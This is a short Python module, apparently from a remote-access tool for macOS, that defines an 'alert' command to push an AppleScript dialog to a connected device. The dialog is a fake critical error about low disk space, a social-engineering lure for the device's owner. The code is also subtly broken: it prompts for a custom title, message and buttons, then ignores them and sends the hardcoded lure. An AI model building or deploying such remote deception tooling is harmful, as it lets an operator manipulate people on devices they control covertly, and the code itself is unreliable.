import time
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "alert"
        self.description = "Make alert show up on device."
        self.type = "applescript"

    def run(self,session,cmd_data):
        title = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Title: ")
        message = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Message: ")
        fbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" First button: ")
        sbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" Second button: ")
        one = '"'
        payload = """
        set theAlertText to "An error has occurred."
        set theAlertMessage to "The amount of available free space is dangerously low. Would you like to continue?"
        display alert theAlertText message theAlertMessage as critical buttons {"Don't Continue", "Continue"} default button "Continue" cancel button "Don't Continue"
        """
        cmd_data.update({"cmd":"applescript","args":payload})
